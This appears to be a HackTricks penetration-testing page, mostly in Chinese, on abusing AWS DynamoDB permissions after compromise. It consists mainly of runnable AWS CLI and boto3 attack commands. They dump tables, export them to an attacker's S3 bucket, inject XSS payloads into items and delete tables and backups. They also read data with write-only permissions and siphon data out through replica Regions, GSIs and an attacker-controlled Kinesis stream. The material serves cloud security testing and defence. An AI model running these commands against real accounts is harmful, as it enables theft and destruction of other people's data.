# AWS - DynamoDB Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## DynamoDB

更多信息请参阅：

{{#ref}}
../../aws-services/aws-dynamodb-enum.md
{{#endref}}

### `dynamodb:BatchGetItem`

拥有此权限的 attacker 将能够 **通过主键从表中获取项** (你不能直接请求表的所有数据)。这意味着你需要知道主键（你可以通过获取表元数据来获得，`describe-table`）。

{{#tabs }}
{{#tab name="json file" }}
```bash
aws dynamodb batch-get-item --request-items file:///tmp/a.json

// With a.json
{
"ProductCatalog" : { // This is the table name
"Keys": [
{
"Id" : { // Primary keys name
"N": "205" // Value to search for, you could put here entries from 1 to 1000 to dump all those
}
}
]
}
}
```
{{#endtab }}

{{#tab name="inline" }}
```bash
aws dynamodb batch-get-item \
--request-items '{"TargetTable": {"Keys": [{"Id": {"S": "item1"}}, {"Id": {"S": "item2"}}]}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potential Impact:** 通过在表中定位敏感信息实现 Indirect privesc

### `dynamodb:GetItem`

**与之前的权限相似** 该权限允许潜在攻击者在已知要检索条目的主键的情况下，从单个表中读取值：
```json
aws dynamodb get-item --table-name ProductCatalog --key  file:///tmp/a.json

// With a.json
{
"Id" : {
"N": "205"
}
}
```
有了这个权限，也可以使用 **`transact-get-items`** 方法，例如：
```json
aws dynamodb transact-get-items \
--transact-items file:///tmp/a.json

// With a.json
[
{
"Get": {
"Key": {
"Id": {"N": "205"}
},
"TableName": "ProductCatalog"
}
}
]
```
**潜在影响：** 间接 privesc， 通过在表中定位敏感信息

### `dynamodb:Query`

**与之前的权限类似** 该权限允许潜在攻击者在知道条目主键的情况下从单个表读取值。它允许使用 [subset of comparisons](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API_Condition.html)，但与必须出现的主键一起使用的唯一比较是 "EQ"，因此你无法通过一次请求使用比较来获取整个数据库。

{{#tabs }}
{{#tab name="json file" }}
```bash
aws dynamodb query --table-name ProductCatalog --key-conditions file:///tmp/a.json

// With a.json
{
"Id" : {
"ComparisonOperator":"EQ",
"AttributeValueList": [ {"N": "205"} ]
}
}
```
{{#endtab }}

{{#tab name="inline" }}
```bash
aws dynamodb query \
--table-name TargetTable \
--key-condition-expression "AttributeName = :value" \
--expression-attribute-values '{":value":{"S":"TargetValue"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**潜在影响：** 间接 privesc，通过在表中定位敏感信息

### `dynamodb:Scan`

您可以使用此权限**轻松 dump 整个表**。
```bash
aws dynamodb scan --table-name <t_name> #Get data inside the table
```
**Potential Impact:** 通过在表中定位敏感信息实现间接 privesc

### `dynamodb:PartiQLSelect`

你可以使用此权限来**轻松 dump 整个表**。
```bash
aws dynamodb execute-statement \
--statement "SELECT * FROM ProductCatalog"
```
此权限还允许执行类似于 `batch-execute-statement` 的操作：
```bash
aws dynamodb batch-execute-statement \
--statements '[{"Statement": "SELECT * FROM ProductCatalog WHERE Id = 204"}]'
```
但你需要为主键指定一个值，所以这并不是很有用。

**Potential Impact:** 间接 privesc：通过定位表中的敏感信息

### `dynamodb:ExportTableToPointInTime|(dynamodb:UpdateContinuousBackups)`

此权限将允许攻击者**将整个表导出到其选择的 S3 bucket**：
```bash
aws dynamodb export-table-to-point-in-time \
--table-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable \
--s3-bucket <attacker_s3_bucket> \
--s3-prefix <optional_prefix> \
--export-time <point_in_time> \
--region <region>
```
注意：要使此方法生效，该表必须启用 point-in-time-recovery。你可以使用以下命令检查表是否启用了它：
```bash
aws dynamodb describe-continuous-backups \
--table-name <tablename>
```
如果它未启用，你需要**启用它**，为此你需要**`dynamodb:ExportTableToPointInTime`**权限：
```bash
aws dynamodb update-continuous-backups \
--table-name <value> \
--point-in-time-recovery-specification PointInTimeRecoveryEnabled=true
```
**Potential Impact:** Indirect privesc 通过在表中定位敏感信息

### `dynamodb:CreateTable`, `dynamodb:RestoreTableFromBackup`, (`dynamodb:CreateBackup)` 

拥有这些权限的攻击者能够**从备份创建新表**（甚至可以先创建备份，然后在不同的表中恢复）。随后，拥有必要权限的攻击者可以检查备份中的**信息**，这些信息可能**不再出现在生产**表中。
```bash
aws dynamodb restore-table-from-backup \
--backup-arn <source-backup-arn> \
--target-table-name <new-table-name> \
--region <region>
```
**潜在影响：** 通过在表备份中定位敏感信息实现间接 privesc

### `dynamodb:PutItem`

该权限允许用户添加**新项到表中或用新项替换已存在的项**。如果具有相同主键的项已存在，**整个项将被新项替换**。如果主键不存在，则会**创建**具有指定主键的新项。

{{#tabs }}
{{#tab name="XSS Example" }}
```bash
## Create new item with XSS payload
aws dynamodb put-item --table <table_name> --item file://add.json
### With add.json:
{
"Id": {
"S": "1000"
},
"Name": {
"S":  "Marc"
},
"Description": {
"S": "<script>alert(1)</script>"
}
}
```
{{#endtab }}

{{#tab name="AI Example" }}
```bash
aws dynamodb put-item \
--table-name ExampleTable \
--item '{"Id": {"S": "1"}, "Attribute1": {"S": "Value1"}, "Attribute2": {"S": "Value2"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**潜在影响：** 通过在 DynamoDB 表中添加/修改数据，可能导致进一步利用漏洞/bypasses

### `dynamodb:UpdateItem`

此权限允许用户**修改项的现有属性或向项添加新属性**。它**不会替换**整个项；它仅更新指定的属性。如果表中不存在主键，则该操作将**使用指定的主键创建一个新项**，并设置更新表达式中指定的属性。

{{#tabs }}
{{#tab name="XSS Example" }}
```bash
## Update item with XSS payload
aws dynamodb update-item --table <table_name> \
--key file://key.json --update-expression "SET Description = :value" \
--expression-attribute-values file://val.json
### With key.json:
{
"Id": {
"S": "1000"
}
}
### and val.json
{
":value": {
"S": "<script>alert(1)</script>"
}
}
```
{{#endtab }}

{{#tab name="AI Example" }}
```bash
aws dynamodb update-item \
--table-name ExampleTable \
--key '{"Id": {"S": "1"}}' \
--update-expression "SET Attribute1 = :val1, Attribute2 = :val2" \
--expression-attribute-values '{":val1": {"S": "NewValue1"}, ":val2": {"S": "NewValue2"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potential Impact:** 能够在 DynamoDB 表中添加/修改数据，从而可能被用于利用更多 vulnerabilities/bypasses

### `dynamodb:DeleteTable`

具有此权限的攻击者可以**删除 DynamoDB 表，导致数据丢失**。
```bash
aws dynamodb delete-table \
--table-name TargetTable \
--region <region>
```
**潜在影响**: 数据丢失以及依赖被删除表的服务中断。

### `dynamodb:DeleteBackup`

拥有此权限的攻击者可以**删除 DynamoDB 备份，可能在灾难恢复情况下导致数据丢失**。
```bash
aws dynamodb delete-backup \
--backup-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable/backup/BACKUP_ID \
--region <region>
```
**潜在影响**: 在灾难恢复场景中可能导致数据丢失并无法从备份恢复。

### `dynamodb:StreamSpecification`, `dynamodb:UpdateTable`, `dynamodb:DescribeStream`, `dynamodb:GetShardIterator`, `dynamodb:GetRecords`

> [!NOTE]
> TODO: 测试这是否确实可行

具有这些权限的攻击者可以**在 DynamoDB 表上启用 stream，更新表以开始对更改进行流式传输，然后访问该 stream 以实时监控表的更改**。这允许攻击者监控并 exfiltrate 数据更改，可能导致 data leakage。

1. 在 DynamoDB 表上启用 stream:
```bash
aws dynamodb update-table \
--table-name TargetTable \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES \
--region <region>
```
2. 描述该 stream 以获取 ARN 和其他详细信息：
```bash
aws dynamodb describe-stream \
--table-name TargetTable \
--region <region>
```
3. 使用 stream ARN 获取 shard iterator：
```bash
aws dynamodbstreams get-shard-iterator \
--stream-arn <stream_arn> \
--shard-id <shard_id> \
--shard-iterator-type LATEST \
--region <region>
```
4. 使用 shard iterator 从 stream 中访问并 exfiltrate 数据：
```bash
aws dynamodbstreams get-records \
--shard-iterator <shard_iterator> \
--region <region>
```
**Potential impact**: 实时监控和 DynamoDB 表更改的数据泄露。

### 通过 `dynamodb:UpdateItem` 和 `ReturnValues=ALL_OLD` 读取项

攻击者仅具有表上的 `dynamodb:UpdateItem` 权限时，可以在没有任何常规读取权限（`GetItem`/`Query`/`Scan`）的情况下，通过执行一次良性更新并请求 `--return-values ALL_OLD` 来读取项。DynamoDB 会在响应的 `Attributes` 字段中返回项的更新前完整镜像（这不会消耗 RCUs）。

- Minimum permissions: `dynamodb:UpdateItem` on the target table/key.
- Prerequisites: You must know the item's primary key.

示例（添加一个无害属性并在响应中 exfiltrates 先前的项）：
```bash
aws dynamodb update-item \
--table-name <TargetTable> \
--key '{"<PKName>":{"S":"<PKValue>"}}' \
--update-expression 'SET #m = :v' \
--expression-attribute-names '{"#m":"exfil_marker"}' \
--expression-attribute-values '{":v":{"S":"1"}}' \
--return-values ALL_OLD \
--region <region>
```
The CLI 响应将包含一个 `Attributes` 块，包含完整的先前项（所有属性），从而实际上在仅写权限下提供了读取原语。

**Potential Impact:** 在只有写权限的情况下读取表中任意项，当已知主键时，可能导致敏感数据 exfiltration。


### `dynamodb:UpdateTable (replica-updates)` | `dynamodb:CreateTableReplica`

通过向 DynamoDB Global Table (version 2019.11.21) 添加一个新的副本 Region 可实现隐蔽的 exfiltration。如果某个主体可以添加区域副本，整个表将被复制到攻击者选择的 Region，攻击者可以从该 Region 读取所有项。

{{#tabs }}
{{#tab name="PoC (default DynamoDB-managed KMS)" }}
```bash
# Add a new replica Region (from primary Region)
aws dynamodb update-table \
--table-name <TableName> \
--replica-updates '[{"Create": {"RegionName": "<replica-region>"}}]' \
--region <primary-region>

# Wait until the replica table becomes ACTIVE in the replica Region
aws dynamodb describe-table --table-name <TableName> --region <replica-region> --query 'Table.TableStatus'

# Exfiltrate by reading from the replica Region
aws dynamodb scan --table-name <TableName> --region <replica-region>
```
{{#endtab }}
{{#tab name="PoC (customer-managed KMS)" }}
```bash
# Specify the CMK to use in the replica Region
aws dynamodb update-table \
--table-name <TableName> \
--replica-updates '[{"Create": {"RegionName": "<replica-region>", "KMSMasterKeyId": "arn:aws:kms:<replica-region>:<account-id>:key/<cmk-id>"}}]' \
--region <primary-region>
```
{{#endtab }}
{{#endtabs }}

权限：`dynamodb:UpdateTable`（具有 `replica-updates`）或 `dynamodb:CreateTableReplica` 针对目标表。如果在副本中使用 CMK，则可能需要该密钥的 KMS 权限。

潜在影响：将整个表复制到攻击者控制的 Region，从而导致 stealthy data exfiltration。

### `dynamodb:TransactWriteItems`（通过失败条件读取 + `ReturnValuesOnConditionCheckFailure=ALL_OLD`）

攻击者若具有事务性写权限，可在 `TransactWriteItems` 中执行一个 `Update` 操作，同时设置 `ReturnValuesOnConditionCheckFailure=ALL_OLD` 并故意使 `ConditionExpression` 失败，从而 exfiltrate 现有项的完整属性。在失败时，DynamoDB 会在事务取消原因中包含先前的属性，有效地将写-only 访问转为对目标键的读取访问。

{{#tabs }}
{{#tab name="PoC (AWS CLI >= supports cancellation reasons)" }}
```bash
# Create the transaction input (list form for --transact-items)
cat > /tmp/tx_items.json << 'JSON'
[
{
"Update": {
"TableName": "<TableName>",
"Key": {"<PKName>": {"S": "<PKValue>"}},
"UpdateExpression": "SET #m = :v",
"ExpressionAttributeNames": {"#m": "marker"},
"ExpressionAttributeValues": {":v": {"S": "x"}},
"ConditionExpression": "attribute_not_exists(<PKName>)",
"ReturnValuesOnConditionCheckFailure": "ALL_OLD"
}
}
]
JSON

# Execute. Newer AWS CLI versions support returning cancellation reasons
aws dynamodb transact-write-items \
--transact-items file:///tmp/tx_items.json \
--region <region> \
--return-cancellation-reasons
# The command fails with TransactionCanceledException; parse cancellationReasons[0].Item
```
{{#endtab }}
{{#tab name="PoC (boto3)" }}
```python
import boto3
c=boto3.client('dynamodb',region_name='<region>')
try:
c.transact_write_items(TransactItems=[{ 'Update': {
'TableName':'<TableName>',
'Key':{'<PKName>':{'S':'<PKValue>'}},
'UpdateExpression':'SET #m = :v',
'ExpressionAttributeNames':{'#m':'marker'},
'ExpressionAttributeValues':{':v':{'S':'x'}},
'ConditionExpression':'attribute_not_exists(<PKName>)',
'ReturnValuesOnConditionCheckFailure':'ALL_OLD'}}])
except c.exceptions.TransactionCanceledException as e:
print(e.response['CancellationReasons'][0]['Item'])
```
{{#endtab }}
{{#endtabs }}

权限：`dynamodb:TransactWriteItems` 在目标表上（以及底层 item）。无需读取权限。

潜在影响：仅使用事务写权限，通过返回的取消原因按主键读取表中的任意 item。


### `dynamodb:UpdateTable` + `dynamodb:UpdateItem` + `dynamodb:Query` 在 GSI 上

通过在低熵属性上创建 `ProjectionType=ALL` 的 Global Secondary Index (GSI)，将该属性在所有 item 上设置为固定值，然后 `Query` 索引以检索完整 item，从而绕过读取限制。即使对基表的 `Query`/`Scan` 被拒，只要你可以查询索引 ARN，此方法仍然有效。

- 最低权限：
- `dynamodb:UpdateTable` 在目标表上（用于创建带有 `ProjectionType=ALL` 的 GSI）。
- `dynamodb:UpdateItem` 在目标表的键上（用于在每个 item 上设置被索引的属性）。
- `dynamodb:Query` 在索引资源 ARN 上（`arn:aws:dynamodb:<region>:<account-id>:table/<TableName>/index/<IndexName>`）。

步骤（PoC 在 us-east-1）：
```bash
# 1) Create table and seed items (without the future GSI attribute)
aws dynamodb create-table --table-name HTXIdx \
--attribute-definitions AttributeName=id,AttributeType=S \
--key-schema AttributeName=id,KeyType=HASH \
--billing-mode PAY_PER_REQUEST --region us-east-1
aws dynamodb wait table-exists --table-name HTXIdx --region us-east-1
for i in 1 2 3 4 5; do \
aws dynamodb put-item --table-name HTXIdx \
--item "{\"id\":{\"S\":\"$i\"},\"secret\":{\"S\":\"sec-$i\"}}" \
--region us-east-1; done

# 2) Add GSI on attribute X with ProjectionType=ALL
aws dynamodb update-table --table-name HTXIdx \
--attribute-definitions AttributeName=X,AttributeType=S \
--global-secondary-index-updates '[{"Create":{"IndexName":"ExfilIndex","KeySchema":[{"AttributeName":"X","KeyType":"HASH"}],"Projection":{"ProjectionType":"ALL"}}}]' \
--region us-east-1
# Wait for index to become ACTIVE
aws dynamodb describe-table --table-name HTXIdx --region us-east-1 \
--query 'Table.GlobalSecondaryIndexes[?IndexName==`ExfilIndex`].IndexStatus'

# 3) Set X="dump" for each item (only UpdateItem on known keys)
for i in 1 2 3 4 5; do \
aws dynamodb update-item --table-name HTXIdx \
--key "{\"id\":{\"S\":\"$i\"}}" \
--update-expression 'SET #x = :v' \
--expression-attribute-names '{"#x":"X"}' \
--expression-attribute-values '{":v":{"S":"dump"}}' \
--region us-east-1; done

# 4) Query the index by the constant value to retrieve full items
aws dynamodb query --table-name HTXIdx --index-name ExfilIndex \
--key-condition-expression '#x = :v' \
--expression-attribute-names '{"#x":"X"}' \
--expression-attribute-values '{":v":{"S":"dump"}}' \
--region us-east-1
```
**Potential Impact:** 通过查询新建的 GSI（投影所有属性）进行完整表数据外泄，即使基表的读取 API 被拒绝也能实现。

### `dynamodb:EnableKinesisStreamingDestination` (通过 Kinesis Data Streams 持续外泄)

滥用 DynamoDB 的 Kinesis streaming destinations 将表的变更持续导出到攻击者控制的 Kinesis Data Stream。一旦启用，每次 INSERT/MODIFY/REMOVE 事件都会被近实时转发到该 stream，而无需对表具有读取权限。

Minimum permissions (attacker):
- `dynamodb:EnableKinesisStreamingDestination` on the target table
- Optionally `dynamodb:DescribeKinesisStreamingDestination`/`dynamodb:DescribeTable` to monitor status
- Read permissions on the attacker-owned Kinesis stream to consume records: `kinesis:*`

<details>
<summary>PoC (us-east-1)</summary>
```bash
# 1) Prepare: create a table and seed one item
aws dynamodb create-table --table-name HTXKStream \
--attribute-definitions AttributeName=id,AttributeType=S \
--key-schema AttributeName=id,KeyType=HASH \
--billing-mode PAY_PER_REQUEST --region us-east-1
aws dynamodb wait table-exists --table-name HTXKStream --region us-east-1
aws dynamodb put-item --table-name HTXKStream \
--item file:///tmp/htx_item1.json --region us-east-1
# /tmp/htx_item1.json
# {"id":{"S":"a1"},"secret":{"S":"s-1"}}

# 2) Create attacker Kinesis Data Stream
aws kinesis create-stream --stream-name htx-ddb-exfil --shard-count 1 --region us-east-1
aws kinesis wait stream-exists --stream-name htx-ddb-exfil --region us-east-1

# 3) Enable the DynamoDB -> Kinesis streaming destination
STREAM_ARN=$(aws kinesis describe-stream-summary --stream-name htx-ddb-exfil \
--region us-east-1 --query StreamDescriptionSummary.StreamARN --output text)
aws dynamodb enable-kinesis-streaming-destination \
--table-name HTXKStream --stream-arn "$STREAM_ARN" --region us-east-1
# Optionally wait until ACTIVE
aws dynamodb describe-kinesis-streaming-destination --table-name HTXKStream \
--region us-east-1 --query KinesisDataStreamDestinations[0].DestinationStatus

# 4) Generate changes on the table
aws dynamodb put-item --table-name HTXKStream \
--item file:///tmp/htx_item2.json --region us-east-1
# /tmp/htx_item2.json
# {"id":{"S":"a2"},"secret":{"S":"s-2"}}
aws dynamodb update-item --table-name HTXKStream \
--key file:///tmp/htx_key_a1.json \
--update-expression "SET #i = :v" \
--expression-attribute-names {#i:info} \
--expression-attribute-values {:v:{S:updated}} \
--region us-east-1
# /tmp/htx_key_a1.json -> {"id":{"S":"a1"}}

# 5) Consume from Kinesis to observe DynamoDB images
SHARD=$(aws kinesis list-shards --stream-name htx-ddb-exfil --region us-east-1 \
--query Shards[0].ShardId --output text)
IT=$(aws kinesis get-shard-iterator --stream-name htx-ddb-exfil --shard-id "$SHARD" \
--shard-iterator-type TRIM_HORIZON --region us-east-1 --query ShardIterator --output text)
aws kinesis get-records --shard-iterator "$IT" --limit 10 --region us-east-1 > /tmp/krec.json
# Decode one record (Data is base64-encoded)
jq -r .Records[0].Data /tmp/krec.json | base64 --decode | jq .

# 6) Cleanup (recommended)
aws dynamodb disable-kinesis-streaming-destination \
--table-name HTXKStream --stream-arn "$STREAM_ARN" --region us-east-1 || true
aws kinesis delete-stream --stream-name htx-ddb-exfil --enforce-consumer-deletion --region us-east-1 || true
aws dynamodb delete-table --table-name HTXKStream --region us-east-1 || true
```
</details>

**潜在影响：** 持续的、近实时 exfiltration 将表更改发送到由攻击者控制的 Kinesis stream，而无需对表进行直接读取操作。



{{#include ../../../../banners/hacktricks-training.md}}
